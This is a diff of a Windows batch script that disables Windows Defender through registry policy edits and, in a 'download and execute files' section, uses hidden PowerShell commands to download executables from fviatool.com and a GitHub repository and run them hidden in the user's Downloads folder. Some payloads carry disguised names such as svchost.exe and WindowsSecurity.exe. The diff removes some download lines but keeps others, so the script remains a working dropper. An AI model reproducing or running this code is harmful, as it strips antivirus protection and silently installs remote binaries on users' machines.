@@ -44,14 +44,9 @@ echo Windows Defender has been disabled.
 
 :: Function to download and execute files
 :download_and_execute_files
-powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/defender.exe', 'C:\Users\%USERNAME%\Downloads\defender.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\defender.exe' -WindowStyle Hidden"
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/fviatool/fvia/main/svchost.exe', 'C:\Users\%USERNAME%\Downloads\svchost.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\svchost.exe' -WindowStyle Hidden"
-powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/WindowsSecurity.exe', 'C:\Users\%USERNAME%\Downloads\WindowsSecurity.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\WindowsSecurity.exe' -WindowStyle Hidden"
-powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/update.exe', 'C:\Users\%USERNAME%\Downloads\update.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\update.exe' -WindowStyle Hidden"
-powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/get.exe', 'C:\Users\%USERNAME%\Downloads\get.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\get.exe' -WindowStyle Hidden"
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/fviatool/fvia/raw/main/update.exe', 'C:\Users\%USERNAME%\Downloads\update.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\update.exe' -WindowStyle Hidden"
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/fviatool/fvia/raw/main/fvia.exe', 'C:\Users\%USERNAME%\Downloads\fvia.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\fvia.exe' -WindowStyle Hidden"
-powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://fviatool.com/Runtime.exe', 'C:\Users\%USERNAME%\Downloads\Runtime.exe’); Start-Process -FilePath ‘C:\Users%USERNAME%\Downloads\Runtime.exe’ -WindowStyle Hidden”
 set "defenderDisableCmds[0]=REG ADD ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender"" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
 set "defenderDisableCmds[1]=REG ADD ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f"
 set "defenderDisableCmds[2]=REG ADD ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f"
